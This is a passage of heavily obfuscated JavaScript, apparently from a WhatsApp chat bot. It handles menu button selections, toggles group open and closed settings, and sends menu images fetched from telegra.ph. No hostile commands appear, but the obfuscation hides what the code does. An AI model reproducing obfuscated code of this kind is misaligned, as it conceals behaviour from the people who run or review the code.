_0x3752a1='*PLAY\x20MUSI'+'C*'+enter+enter+'*Title*\x20:\x20'+_0x4dc9ca+enter+(_0x1ec679(0x2e7,0x3e5,0x4ae,0x4e2)+'3')+enter+'*Size*\x20:\x20'+_0x56ed2e+enter+_0x1ec679(0x6aa,0xaf9,0x9b1,0x339)+_0x2c3fb6[_0x1ec679(0x42b,0xe7,0x644,0x337)]+enter+enter+(_0x26197c(0x68a,0x750,0x745,0x7f3)+_0x1ec679(0x1c4,0x6bc,-0xcb,0xc8)+'e\x20media\x20se'+'dang\x20dikir'+_0x26197c(-0x62,0x1d3,0x12a,-0x31f)+_0x1ec679(-0x1cf,0x1bd,0x2e0,-0xdf)+_0x1ec679(0x2a0,0x572,0x536,0x291)+'t_');_0xbfc2bf['CiMGn'](sendMediaURL,from,_0x7fc1a2,_0x3752a1),await _0xbfc2bf[_0x1ec679(0x398,0x88f,0x383,0x890)](sendMediaURL,from,_0x41fa99)[_0x26197c(0xb5e,0x879,0xaa7,0xace)](()=>reply(_0x26197c(0x766,0x342,0x712,-0x5)));}});});}catch(_0x7a4753){reply(mess['error'][_0x1e23e4(0x880,0xf30,0xae9,0xb77)]);}}}sub_yt_zeeone_ofc=type=='listRespon'+_0x1e23e4(0xe40,0x8d6,0xa63,0xd05)?mek[_0x1e23e4(0x549,0x7ce,0x9a7,0xbd6)][_0x593f96(0xacf,0xed8,0x70c,0xee1)+'seMessage'][_0x1e23e4(0x32c,0x539,0x77a,0x32c)]:'',subscribezeeoneofc=type==_0x593f96(0xa91,0x8b3,0xb4b,0xb65)+_0x1e23e4(0x520,0x57d,0x471,0x99)+'ge'?mek[_0x593f96(0xb85,0xfe4,0x6a7,0xee1)][_0x593f96(0xa91,0x603,0xf36,0x968)+_0x593f96(0x64f,0x56b,0x34b,0xa20)+'ge'][_0x1e23e4(0xa01,0x6f2,0xa2f,0x8cb)+_0x593f96(0x5ed,0x417,0x9d9,0x630)]:'';if(sub_yt_zeeone_ofc==_0x1e23e4(0x92c,0x663,0x522,0x5b6)){console['log'](color(time,_0x593f96(0x359,0x5c6,0x3c4,0x1b9)),color(_0x593f96(0x587,0x319,0x9e,0x997)+'ge\x20group\x20o'+'pen'));if(!isBotGroupAdmins)return reply(_0x593f96(0x3e1,0x18c,-0xdf,0x650)+_0x1e23e4(0x670,0x913,0x5ec,0x9d9)+_0x1e23e4(0x2be,0x266,0x669,0x1c1)+_0x593f96(0x5dd,0x18c,0x99d,0x4a5)+_0x1e23e4(0x5a1,0x626,0x916,0xc89));await alpha[_0x593f96(0x92d,0xcc9,0x5b9,0x920)+'ngChange'](from,GroupSettingChange[_0x593f96(0x536,0x574,0x8c8,0x6a4)+'d'],![]),fakegroup(_0x1e23e4(0x299,0x1b1,0x600,0x3bd)+'FULLY\x20OPEN'+_0x1e23e4(-0x1a6,0x31e,0x344,0x48)+'``');}if(sub_yt_zeeone_ofc==_0x1e23e4(0x4d3,0x562,0x34c,0x168)+'e'){console[_0x593f96(0x76c,0x5ba,0x907,0x481)](color(time,_0x593f96(0x359,0x6f6,0x336,0x4df)),color(_0x593f96(0x587,0x5ef,0x533,0x8b7)+_0x1e23e4(0x83e,0x9f,0x519,0x9d2)+_0x1e23e4(0xeae,0x83d,0xafb,0x890)));if(!isBotGroupAdmins)return reply(_0x1e23e4(0x6bc,-0x19c,0x203,0x10e)+'\x20Bot\x20sebag'+_0x593f96(0x847,0x9fe,0x94a,0x69b)+_0x593f96(0x5dd,0x1cd,0x57f,0x44e)+_0x1e23e4(0x917,0x8b8,0x916,0x5e6));await alpha[_0x593f96(0x92d,0xb15,0xcbd,0xb03)+_0x1e23e4(0x61d,0x7ed,0xa25,0x7eb)](from,GroupSettingChange[_0x1e23e4(-0x147,0x5de,0x358,0x274)+'d'],!![]),fakegroup(_0x593f96(0x7de,0x40b,0xae2,0x755)+_0x1e23e4(0x594,0x66c,0x5ce,0x8e6)+_0x1e23e4(-0x297,0x4ad,0x1ec,0x6f4));}if(sub_yt_zeeone_ofc=='quotesmenu'){console['log'](color(time,_0x593f96(0x359,0x39e,0x1db,-0x1a7)),color('List\x20messa'+_0x1e23e4(0x794,0x64c,0x84a,0xc76)+_0x593f96(0x8a2,0x6ee,0x50a,0x3f7)));var quoteamzk=await getBuffer(_0x1e23e4(-0x18d,-0x8b,0x165,0x51)+'legra.ph/f'+'ile/924310'+_0x1e23e4(0x73e,0xc77,0x895,0xaf9)+_0x1e23e4(0x44c,-0x16f,0x1d8,0x4e7));const _0x19e753={};_0x19e753[_0x1e23e4(-0x2b2,0x338,0x1de,0x4b4)+'t']='⋮☰\x20BACK';const _0x5be2cd={};_0x5be2cd[_0x593f96(0x3de,0x8d1,0x7a4,0x5a8)]=_0x593f96(0x312,0xb8,0x6ea,0x1cd),_0x5be2cd['buttonText']=_0x19e753,_0x5be2cd[_0x593f96(0xb7e,0xac9,0xf7d,0xc45)]=0x1;const _0x4a1606={};_0x4a1606[_0x593f96(0x3bc,-0x2f,0x185,-0x146)+'t']=_0x593f96(0x77d,0x8af,0xc4e,0x5e1);const _0x415e76={};_0x415e76[_0x593f96(0x3de,0x653,0x392,0x1a3)]=_0x593f96(0x457,0x6fc,0xaa,-0x37),_0x415e76[_0x593f96(0x2a4,0x78a,0x18,0x374)]=_0x4a1606,_0x415e76[_0x1e23e4(0xe07,0x5d5,0x9a0,0xe3c)]=0x1,sendButLocation(from,quotesmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x593f96(0x311,-0x3c,0x253,0x3f8)]('@')[-0xee5+-0x169a+0x1d*0x14b],quoteamzk,[_0x5be2cd,_0x415e76],{'contextInfo':{'mentionedJid':[ini_mark]}});}function _0x593f96(_0x4feaeb,_0x1f7fe1,_0x411fa4,_0x5019d4){return _0x1511(_0x4feaeb-0x1e4,_0x1f7fe1);}if(sub_yt_zeeone_ofc==_0x593f96(0xa50,0xee4,0xec4,0xad1)){console[_0x593f96(0x76c,0x5a4,0x937,0x2da)](color(time,_0x593f96(0x359,0x7b7,-0x70,0x4c7)),color(_0x593f96(0x587,0x9ad,0x205,0x61f)+_0x593f96(0xa28,0x54a,0x7aa,0xca6)+'enu'));var jakkja=await getBuffer(_0x593f96(0x343,0x7a4,0x824,0x416)+_0x1e23e4(0x74f,0x2da,0x664,0x341)+_0x593f96(0x667,0x5a7,0x5cc,0x586)+_0x1e23e4(0x185,-0x226,0x24d,0x44f)+'48acc.jpg');const _0x1f9c0c={};_0x1f9c0c[_0x1e23e4(-0x150,0x507,0x1de,0x36f)+'t']='⋮☰\x20BACK';const _0x1cd7bd={};_0x1cd7bd[_0x593f96(0x3de,0x807,0x293,-0xfb)]=_0x593f96(0x312,0x43d,0x560,-0x74),_0x1cd7bd['buttonText']=_0x1f9c0c,_0x1cd7bd['type']=0x1;const _0x3dc383={};_0x3dc383[_0x593f96(0x3bc,0x3a4,0x9d,0x647)+'t']=_0x1e23e4(0x404,0xc8,0x59f,0x915);const _0x5bd404={};_0x5bd404[_0x593f96(0x3de,0x66f,0x763,0xb1)]=_0x593f96(0x457,0x6d1,0x3aa,0xe6),_0x5bd404['buttonText']=_0x3dc383,_0x5bd404['type']=0x1,sendButLocation(from,groupmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,-0x1c5,0x1de,0x22d)+ini_mark[_0x1e23e4(-0x2d4,0x2df,0x133,0x642)]('@')[-0xaff+0x8*-0x1cf+0x1*0x1977],jakkja,[_0x1cd7bd,_0x5bd404],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x816,0x3b7,0x4cb,0xa19)){console[_0x1e23e4(0x100,0x56c,0x58e,0x5cf)](color(time,'magenta'),color(_0x593f96(0x587,0x96,0x3e1,0x70e)+'ge\x20animeme'+'nu'));var animkzka=await getBuffer(_0x1e23e4(-0x242,-0x31c,0x165,0x301)+_0x1e23e4(0x648,0x834,0x664,0x526)+'ile/435878'+_0x1e23e4(0xad0,0xbe2,0x9fa,0x969)+_0x1e23e4(-0x16f,-0x24a,0x259,-0x214));const _0x23be30={};_0x23be30[_0x1e23e4(-0x10c,0x693,0x1de,0x39b)+'t']='⋮☰\x20BACK';const _0x5a719f={};_0x5a719f[_0x1e23e4(0x330,0x615,0x200,0x29c)]=_0x593f96(0x312,-0x1fa,0x405,0x216),_0x5a719f[_0x1e23e4(-0x27,-0x79,0xc6,0x25d)]=_0x23be30,_0x5a719f['type']=0x1;const _0x136076={};_0x136076[_0x593f96(0x3bc,0x5e2,0x1f0,0x1ef)+'t']=_0x593f96(0x77d,0x3ee,0xaae,0xa7c);const _0x32ea2e={};_0x32ea2e['buttonId']='owner',_0x32ea2e[_0x1e23e4(0x4d6,0x97,0xc6,-0x446)]=_0x136076,_0x32ea2e[_0x593f96(0xb7e,0x1072,0x6d4,0xe99)]=0x1,sendButLocation(from,animemenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark['split']('@')[0x1b8e+-0x17cb+-0x3c3],animkzka,[_0x5a719f,_0x32ea2e],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x35f,0x497,0x6d0,0x6b9)+'u'){console[_0x1e23e4(0x7ce,0x629,0x58e,0x646)](color(time,_0x593f96(0x359,0x4e1,0x759,0x23b)),color(_0x1e23e4(0x749,0x55a,0x3a9,0xf6)+_0x1e23e4(0x187,0x7fa,0x54d,0x5df)+'menu'));var converkdk=await getBuffer(_0x1e23e4(-0x281,0x323,0x165,0xda)+_0x1e23e4(0x1c1,0x1f8,0x664,0x2bf)+_0x1e23e4(0xabe,0xdae,0xaf0,0x8e5)+_0x593f96(0x5b2,0x305,0x959,0x576)+_0x1e23e4(0x533,0x897,0x8d1,0x427));const _0x4e6bce={};_0x4e6bce[_0x1e23e4(0x69f,0x3e9,0x1de,-0x203)+'t']=_0x1e23e4(0x440,0x59c,0x5f8,0xa4c);const _0x52837d={};_0x52837d[_0x593f96(0x3de,0x846,0x1df,0x7d7)]='Command',_0x52837d[_0x593f96(0x2a4,0x783,0x28f,-0x18b)]=_0x4e6bce,_0x52837d[_0x593f96(0xb7e,0xf5b,0xf53,0xbb8)]=0x1;const _0x2ba920={};_0x2ba920[_0x1e23e4(-0x25f,0x366,0x1de,0x62c)+'t']=_0x1e23e4(0x100,0x919,0x59f,0x147);const _0x444c8d={};_0x444c8d[_0x593f96(0x3de,0xf2,0x521,0x3ec)]='owner',_0x444c8d[_0x593f96(0x2a4,0x313,0x244,-0x138)]=_0x2ba920,_0x444c8d[_0x593f96(0xb7e,0xc0e,0xe55,0x7a5)]=0x1,sendButLocation(from,convertmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(0x46a,-0x24e,0xd3,0x8)+ini_mark[_0x1e23e4(-0x28,0x44e,0x133,0x5f0)]('@')[0x16a4+0xb40+0x5a6*-0x6],converkdk,[_0x52837d,_0x444c8d],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x566,0x1f8,0x816,0x981)){console[_0x1e23e4(0xa95,0xfe,0x58e,0x149)](color(time,_0x1e23e4(0x3de,-0x221,0x17b,0xa5)),color(_0x593f96(0x587,0xa4,0x331,0x2ce)+_0x593f96(0x6fd,0xb25,0x6eb,0x1ff)+_0x1e23e4(0xef6,0xe12,0xaeb,0x7ae)));var nsfwkak=await getBuffer(_0x593f96(0x343,0x851,-0xde,-0x89)+_0x593f96(0x842,0x347,0xac6,0x504)+_0x593f96(0x4dc,0x580,0x28d,0x33f)+_0x1e23e4(0x988,0xc1f,0x9e6,0xdfa)+'ca37c.jpg');const _0x43a2fb={};_0x43a2fb['displayTex'+'t']='⋮☰\x20BACK';const _0x4c5e4d={};_0x4c5e4d[_0x593f96(0x3de,0x531,0x130,0x5de)]=_0x1e23e4(0x4a2,-0xea,0x134,0x13d),_0x4c5e4d['buttonText']=_0x43a2fb,_0x4c5e4d[_0x593f96(0xb7e,0x7ff,0x103a,0xa65)]=0x1;const _0x3dacd3={};_0x3dacd3[_0x1e23e4(-0x288,0x24d,0x1de,0x28c)+'t']=_0x1e23e4(0x2df,0xa52,0x59f,0x559);const _0x187643={};_0x187643['buttonId']='owner',_0x187643['buttonText']=_0x3dacd3,_0x187643[_0x1e23e4(0x53c,0xae2,0x9a0,0x6e2)]=0x1,sendButLocation(from,nsfwmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,-0x77,-0x186,0x434)+ini_mark['split']('@')[-0xee4+-0x270c+0x1*0x35f0],nsfwkak,[_0x4c5e4d,_0x187643],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x1e23e4(0x626,0x779,0x995,0x956)+'u'){console[_0x593f96(0x76c,0x92a,0x7d6,0x644)](color(time,_0x593f96(0x359,0x760,-0x170,0x30f)),color(_0x1e23e4(-0x171,0x58d,0x3a9,0x55f)+_0x593f96(0x6fd,0x4ae,0xa3d,0x675)+_0x593f96(0xcc9,0xcd0,0xe97,0xf4d)));var asupanak=await getBuffer('https://te'+_0x1e23e4(0x82b,0x895,0x664,0xa37)+'ile/cb6aaa'+_0x1e23e4(0xf44,0xa73,0xadf,0xcdc)+_0x593f96(0xa9d,0x591,0xb6d,0xe8e));const _0x1071ff={};_0x1071ff['displayTex'+'t']='⋮☰\x20BACK';const _0x5ecf71={};_0x5ecf71[_0x593f96(0x3de,0x60d,0x3a1,0x707)]=_0x1e23e4(-0x127,0x49d,0x134,-0x1b0),_0x5ecf71[_0x1e23e4(0x336,0x1e6,0xc6,-0xac)]=_0x1071ff,_0x5ecf71[_0x593f96(0xb7e,0xfd5,0xfc9,0xb2a)]=0x1;const _0x1878e1={};_0x1878e1[_0x1e23e4(-0x1e0,0x151,0x1de,0x14f)+'t']='✓\x20OWNER';const _0x24c787={};_0x24c787['buttonId']=_0x593f96(0x457,0x74d,0x911,0x3bd),_0x24c787[_0x1e23e4(0x313,-0x206,0xc6,0x69)]=_0x1878e1,_0x24c787[_0x1e23e4(0x868,0x817,0x9a0,0x9ec)]=0x1,sendButLocation(from,asupanmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(0x495,0x100,0xd3,0x571)+ini_mark[_0x593f96(0x311,-0x1e0,-0xd0,-0x9a)]('@')[-0x59*-0x6d+-0x1*0x204b+0x2*-0x2cd],asupanak,[_0x5ecf71,_0x24c787],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x1e23e4(0x272,0x167,0x399,0x18d)+'ot'){console[_0x593f96(0x76c,0x3fc,0x452,0x942)](color(time,_0x1e23e4(-0x6d,0x56b,0x17b,0x136)),color(_0x1e23e4(0x3ef,0x65c,0x5b2,0x1a5)+'tidak\x20munc'+'ul,\x20kurang'+_0x593f96(0x6e2,0x926,0x22e,0x2b4)+_0x593f96(0xb20,0xeef,0xfec,0x977)));var allmenuk=await getBuffer(_0x593f96(0x343,0xb4,-0x122,0x39b)+_0x1e23e4(0x94c,0x83d,0x664,0x225)+_0x1e23e4(0x599,0x62f,0x731,0x361)+_0x593f96(0xbaf,0x9d6,0xa53,0x9c3)+_0x593f96(0x684,0x28b,0xb28,0x82f));const _0xdd1dd6={};_0xdd1dd6[_0x1e23e4(-0x164,-0x2e,0x1de,0xcf)+'t']=_0x593f96(0x7d6,0x619,0x661,0x7bd);const _0x16cfcb={};_0x16cfcb[_0x1e23e4(0x19a,0x2b6,0x200,0x5cb)]=_0x593f96(0x312,-0x1b6,0x4d9,-0xf1),_0x16cfcb[_0x1e23e4(0x513,0x208,0xc6,0x57d)]=_0xdd1dd6,_0x16cfcb[_0x1e23e4(0xe2b,0x8d5,0x9a0,0x544)]=0x1;const _0x3d241f={};_0x3d241f[_0x1e23e4(0x438,0x2a,0x1de,-0x1b4)+'t']='✓\x20OWNER';const _0x20eee1={};_0x20eee1[_0x1e23e4(0x5b9,-0xce,0x200,0x44e)]=_0x1e23e4(0x5ab,-0x7f,0x279,0x391),_0x20eee1[_0x593f96(0x2a4,0x6b7,0x370,0x20f)]=_0x3d241f,_0x20eee1[_0x593f96(0xb7e,0x983,0x852,0xe87)]=0x1,sendButLocation(from,allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,0x537,0x63d,-0x79)+ini_mark[_0x593f96(0x311,-0x4,0x1a8,0x53a)]('@')[-0x14f7*0x1+0x267+0x1b0*0xb],allmenuk,[_0x16cfcb,_0x20eee1],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x1e23e4(0x79d,0x1ed,0x2ee,0x24a)+'nu'){console[_0x593f96(0x76c,0x69e,0x48a,0x4d8)](color(time,_0x1e23e4(0x437,-0x1e4,0x17b,0xfa)),color(_0x1e23e4(0x4cd,0x564,0x3a9,0x107)+'ge\x20downloa'+_0x1e23e4(0x6dc,0x5d3,0x451,0x1c)));var downloadlsl=await getBuffer(_0x1e23e4(0x78,-0x313,0x165,0x4cd)+'legra.ph/f'+_0x1e23e4(0xbda,0x857,0x789,0x5e3)+'f04fc9dd2d'+'85459.jpg');const _0x3f19ef={};_0x3f19ef[_0x593f96(0x3bc,0x756,0x780,0x102)+'t']=_0x1e23e4(0x983,0x3fa,0x5f8,0x7b1);const _0x31e3db={};_0x31e3db[_0x1e23e4(-0x2c,-0x4d,0x200,0x14b)]=_0x593f96(0x312,0x3,-0xfd,-0x104),_0x31e3db[_0x1e23e4(0x1f4,-0x5e,0xc6,-0x2eb)]=_0x3f19ef,_0x31e3db[_0x593f96(0xb7e,0xece,0xf03,0xe77)]=0x1;const _0x350c0a={};_0x350c0a[_0x1e23e4(-0x89,0xde,0x1de,0x257)+'t']=_0x593f96(0x77d,0x63d,0x697,0xc49);const _0x5ad564={};_0x5ad564['buttonId']='owner',_0x5ad564[_0x593f96(0x2a4,0x293,-0x191,0x573)]=_0x350c0a,_0x5ad564[_0x1e23e4(0x4ff,0x614,0x9a0,0xa1a)]=0x1,sendButLocation(from,downloadmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(0xcc,0x209,0xd3,0x100)+ini_mark['split']('@')[0x11*-0x1df+0x1c85+0x34a],downloadlsl,[_0x31e3db,_0x5ad564],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x81b,0xcc0,0x9d3,0xd2b)){console['log'](color(time,_0x1e23e4(0x52f,-0x384,0x17b,0x3bc)),color(_0x593f96(0x587,0x302,0x82,0x4f5)+_0x593f96(0x556,0x6fd,0x8b8,0x826)));var funmenujs=await getBuffer(_0x1e23e4(0x642,-0x215,0x165,0x481)+'legra.ph/f'+_0x593f96(0x886,0x842,0x86f,0x493)+_0x593f96(0x6a8,0xa27,0x273,0x807)+'fd073.jpg');const _0x26f6fa={};_0x26f6fa[_0x593f96(0x3bc,0x14b,0x318,0x6a0)+'t']=_0x593f96(0x7d6,0x701,0x57d,0x6b2);const _0x1e9b84={};_0x1e9b84[_0x1e23e4(0x5d6,-0x2bf,0x200,-0x63)]=_0x593f96(0x312,0x398,0x50f,0x53c),_0x1e9b84[_0x593f96(0x2a4,0x780,0x1a9,-0x3d)]=_0x26f6fa,_0x1e9b84[_0x593f96(0xb7e,0xac0,0xfd9,0xdd8)]=0x1;const _0x1e4a78={};_0x1e4a78['displayTex'+'t']=_0x1e23e4(0x973,0x9ab,0x59f,0x6e9);const _0x13d7e8={};_0x13d7e8[_0x593f96(0x3de,0x1b7,0xf1,0x3b5)]=_0x593f96(0x457,0x54c,0x93f,0x76b),_0x13d7e8[_0x593f96(0x2a4,0x1a3,0x377,-0x52)]=_0x1e4a78,_0x13d7e8[_0x1e23e4(0x54f,0x905,0x9a0,0xd41)]=0x1,sendButLocation(from,funmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(0x5c6,-0x274,0xd3,0x11c)+ini_mark[_0x593f96(0x311,-0x14c,-0x1d,0x463)]('@')[-0x1a7+0xd87*-0x2+-0x1cb5*-0x1],funmenujs,[_0x1e9b84,_0x13d7e8],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x93a,0x9f7,0xb36,0xb6c)){console[_0x1e23e4(0x574,0x92b,0x58e,0x736)](color(time,'magenta'),color(_0x593f96(0x587,0x1e7,0x2cf,0x5db)+_0x1e23e4(0x685,0x465,0x76f,0x968)+'nu'));var makermenksk=await getBuffer(_0x593f96(0x343,0x5f7,-0x1ce,0x192)+_0x1e23e4(0xb4c,0x1be,0x664,0x842)+'ile/610245'+_0x1e23e4(0x114,0x3ed,0x239,0x709)+_0x593f96(0x772,0x276,0x8af,0x62f));const _0x4f6b40={};_0x4f6b40['displayTex'+'t']=_0x1e23e4(0x479,0x207,0x5f8,0x7e8);const _0x485142={};_0x485142['buttonId']=_0x1e23e4(-0x3aa,-0x2e1,0x134,-0x20a),_0x485142['buttonText']=_0x4f6b40,_0x485142['type']=0x1;const _0x5930dd={};_0x5930dd[_0x1e23e4(-0x61,-0x2f5,0x1de,0x45)+'t']='✓\x20OWNER';const _0x1aeac2={};_0x1aeac2[_0x593f96(0x3de,0x88a,0x442,0x142)]='owner',_0x1aeac2['buttonText']=_0x5930dd,_0x1aeac2[_0x1e23e4(0xdcb,0xc6b,0x9a0,0xd98)]=0x1,sendButLocation(from,makermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(0x585,-0x2b4,0xd3,-0x121)+ini_mark[_0x1e23e4(-0x397,-0x21b,0x133,-0x1f5)]('@')[-0x2*0x817+0x14b*0xb+0x1f5],makermenksk,[_0x485142,_0x1aeac2],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x6fa,0x5af,0x507,0x674)+'u'){console['log'](color(time,_0x593f96(0x359,-0x109,-0x44,0x805)),color(_0x593f96(0x587,0x113,0x430,0x857)+_0x1e23e4(-0x316,-0x395,0x162,0x2d3)+'menu'));var textjskzb=await getBuffer(_0x593f96(0x343,0x425,0x4bf,0x80)+'legra.ph/f'+'ile/148e7a'+_0x1e23e4(0x67b,0x701,0x29d,0x486)+_0x593f96(0x46b,0x3b3,-0x90,0x7a2));const _0x452f8b={};_0x452f8b[_0x593f96(0x3bc,0x4a8,0x7cd,0x7ee)+'t']='⋮☰\x20BACK';const _0x2b0c30={};_0x2b0c30['buttonId']=_0x1e23e4(0x57e,0x116,0x134,-0x1a2),_0x2b0c30['buttonText']=_0x452f8b,_0x2b0c30[_0x593f96(0xb7e,0xba0,0x870,0x873)]=0x1;const _0x3b3ade={};_0x3b3ade[_0x1e23e4(0x6ba,0x524,0x1de,0x62c)+'t']=_0x1e23e4(0x344,0x7d7,0x59f,0x81d);const _0xdac4f3={};_0xdac4f3[_0x1e23e4(0x39b,0x1ec,0x200,0x62a)]='owner',_0xdac4f3['buttonText']=_0x3b3ade,_0xdac4f3[_0x593f96(0xb7e,0x9f0,0xd44,0x81f)]=0x1,sendButLocation(from,textpromenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(0x23b,0x390,0xd3,0x42d)+ini_mark['split']('@')[0x20d9+0xce5*-0x1+-0x13f4],textjskzb,[_0x2b0c30,_0xdac4f3],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='photooxyme'+'nu'){console[_0x1e23e4(0x6a3,0x981,0x58e,0xa8a)](color(time,_0x1e23e4(-0xc3,0x399,0x17b,0x6c)),color('List\x20messa'+_0x593f96(0x655,0x92c,0xb03,0x270)+_0x593f96(0x8bc,0x8b1,0xbee,0xd2d)));var pdkdk=await getBuffer('https://te'+'legra.ph/f'+_0x1e23e4(0x1fd,0x9e3,0x611,0xb12)+_0x1e23e4(0x577,0x316,0x4dc,0x49d)+'e58a0.jpg');const _0x171abb={};_0x171abb['displayTex'+'t']=_0x593f96(0x7d6,0x883,0x48f,0x8fa);const _0x46b5d9={};_0x46b5d9['buttonId']=_0x593f96(0x312,0x47b,0x7fa,0x802),_0x46b5d9['buttonText']=_0x171abb,_0x46b5d9['type']=0x1;const _0x4ed8a0={};_0x4ed8a0[_0x1e23e4(0x3ed,-0x68,0x1de,0x3fd)+'t']='✓\x20OWNER';const _0x419ea2={};_0x419ea2[_0x1e23e4(0x342,0x60e,0x200,0x8a)]=_0x1e23e4(0x2ee,-0x209,0x279,0xff),_0x419ea2['buttonText']=_0x4ed8a0,_0x419ea2[_0x1e23e4(0x4c7,0x959,0x9a0,0xdeb)]=0x1,sendButLocation(from,photooxymenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x593f96(0x311,0x52f,0x202,0x18)]('@')[0x98f+0x1*0xe89+0x404*-0x6],pdkdk,[_0x46b5d9,_0x419ea2],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x42c,0x6f1,0x3d1,0x568)){console['log'](color(time,_0x1e23e4(0x52d,-0x20,0x17b,-0x2e)),color('List\x20messa'+_0x593f96(0x7b7,0x8c7,0x92b,0xb32)+'nu'));var othendjke=await getBuffer(_0x1e23e4(-0x176,-0x106,0x165,0x14d)+_0x1e23e4(0x886,0x2b1,0x664,0xa29)+_0x1e23e4(0x485,-0x1c,0x4d2,0x6ca)+_0x593f96(0x937,0xae3,0x45f,0x766)+_0x593f96(0x57a,0x915,0x72f,0xa6b));const _0x147624={};_0x147624[_0x1e23e4(0x219,0xda,0x1de,-0xaf)+'t']=_0x1e23e4(0x904,0x315,0x5f8,0x83a);const _0x249ab4={};_0x249ab4['buttonId']=_0x1e23e4(0x213,0x44f,0x134,0x458),_0x249ab4[_0x1e23e4(-0x82,0x34b,0xc6,-0x333)]=_0x147624,_0x249ab4[_0x593f96(0xb7e,0xd08,0xd50,0xf28)]=0x1;const _0x589725={};_0x589725['displayTex'+'t']=_0x593f96(0x77d,0x90a,0x57b,0x9ab);const _0x564350={};_0x564350[_0x593f96(0x3de,0x666,0x37b,0x353)]=_0x593f96(0x457,0x77f,0x868,0x13d),_0x564350[_0x593f96(0x2a4,0x4cd,0x30d,0x14)]=_0x589725,_0x564350[_0x593f96(0xb7e,0xb5e,0x9f5,0x1042)]=0x1,sendButLocation(from,othermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,0x5ff,0x6d7,0x663)+ini_mark[_0x1e23e4(0x36c,-0x1fc,0x133,0x2a6)]('@')[0x7*0x1b1+-0xad*0x2e+0x17b*0xd],othendjke,[_0x249ab4,_0x564350],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x1e23e4(0x525,0x3aa,0x1dc,-0x2d0)){console[_0x593f96(0x76c,0x7db,0x7f3,0x80d)](color(time,'magenta'),color(_0x593f96(0x587,0x7a3,0x8a2,0x532)+_0x1e23e4(0xa0a,0xc5f,0xaf6,0xc72)+'nu'));var ownermenjdu=await getBuffer(_0x1e23e4(0x651,0x172,0x165,0x3e6)+'legra.ph/f'+_0x1e23e4(0x8b6,0x54e,0x455,0x2ca)+_0x1e23e4(0x879,0x19c,0x51a,0x9e4)+_0x1e23e4(0x201,0x52e,0x6b5,0x476));const _0x3161d9={};_0x3161d9[_0x1e23e4(0x27c,0x57e,0x1de,0x1e6)+'t']=_0x1e23e4(0xaeb,0x672,0x5f8,0x943);const _0xa9e0a8={};_0xa9e0a8[_0x593f96(0x3de,0x4de,0x76,0x42b)]=_0x593f96(0x312,0x303,0x354,0x6a3),_0xa9e0a8[_0x593f96(0x2a4,-0x121,0x638,0x257)]=_0x3161d9,_0xa9e0a8[_0x1e23e4(0x8ea,0xa6b,0x9a0,0xa38)]=0x1;const _0x274b35={};_0x274b35[_0x593f96(0x3bc,0x5e0,0x7d,0x431)+'t']=_0x1e23e4(0x776,0x6dc,0x59f,0x107);const _0x273dcf={};_0x273dcf['buttonId']=_0x593f96(0x457,0x3fb,0x92c,-0xa0),_0x273dcf[_0x1e23e4(0x355,-0x5d,0xc6,0x36b)]=_0x274b35,_0x273dcf['type']=0x1,sendButLocation(from,ownermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,0x3a8,-0x15b,0x31a)+ini_mark[_0x593f96(0x311,0x8f,0x141,0x72)]('@')[-0x7dd+-0x1cb3+-0x168*-0x1a],ownermenjdu,[_0xa9e0a8,_0x273dcf],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x547,0x504,0x36b,0x3b8)+'u'){console['log'](color(time,_0x593f96(0x359,0x4e3,0x686,0x7a5)),color('List\x20messa'+_0x1e23e4(0x485,0xb7f,0x8ac,0xb99)+_0x1e23e4(0xb8f,0xa03,0xaeb,0xbd5)));var storagemsn=await getBuffer(_0x593f96(0x343,0x94,0x6c,0x816)+_0x593f96(0x842,0x743,0xbe0,0xacd)+_0x593f96(0xa2f,0xc97,0x91d,0xc48)+_0x593f96(0x64a,0x47c,0x739,0x6a9)+'fd896.jpg');const _0x3a32b0={};_0x3a32b0[_0x593f96(0x3bc,-0x15,0x3a0,0x14b)+'t']=_0x1e23e4(0x7ea,0x902,0x5f8,0x861);const 